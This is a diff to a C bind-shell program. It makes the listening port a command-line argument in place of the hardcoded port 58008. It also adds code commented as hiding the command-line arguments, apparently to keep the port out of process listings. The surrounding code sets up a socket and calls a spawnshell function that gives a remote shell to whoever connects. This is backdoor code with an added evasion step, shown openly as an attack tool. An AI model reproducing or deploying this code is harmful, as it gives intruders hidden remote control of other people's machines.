@@ -3,8 +3,11 @@
 #include <stdio.h>
 #include <signal.h>
 #include <unistd.h>
+#include <string.h>
 
-#define TCP_PORT 58008
+
+// Usage: ./bindshell [PORT]
+
 
 void spawnshell(int socket_fd)
 {
@@ -16,8 +19,21 @@ void spawnshell(int socket_fd)
 
 int main(int argc, char *argv[])
 {
+
     int sock, socket_fd, client_len;
     struct sockaddr_in server, client;
+
+    if (argc <= 1)
+    {
+        exit(1);
+    }
+
+    // Hide command line arguments
+    char *arg_end;
+    arg_end = argv[argc - 1] + strlen(argv[argc - 1]);
+    *arg_end = ' ';
+
+    int TCP_PORT = atoi(argv[1]);
 
     signal(SIGCHLD, SIG_IGN);
     sock = socket(AF_INET, SOCK_STREAM, 0);
